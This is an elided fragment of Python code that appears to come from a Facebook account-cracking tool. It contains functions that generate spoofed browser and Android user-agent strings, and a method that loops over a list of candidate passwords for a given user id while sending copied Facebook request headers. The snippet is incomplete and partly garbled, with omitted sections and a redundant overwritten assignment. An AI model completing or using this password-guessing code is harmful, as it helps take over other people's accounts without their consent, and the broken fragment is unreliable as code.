...
def randBuildLSB():
    ...
    ua = f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    return ua
...
def randBuildvsskj():
    ...
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    ua = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    return ua
    ...
    def methodD(self, sid, name, psw):
        ...
        try:
            for pw in psw:
                ...
                'x-fb-request-id': 'Al_CG4RuMZfasuv7fwOsPR0',
                'x-fb-trace-id': 'HRaODTnjBfw',
                'x-fb-rev': '1007519741',
                'x-fb-debug': 'PTksFp7LMMun2AB2KIdxlZ7PMxE5aVxBa4898MB5T5gZyGp0bKyZ1uhZl8b/1Tj8z7H6kWFg/pSm1/2LS36oFQ==',
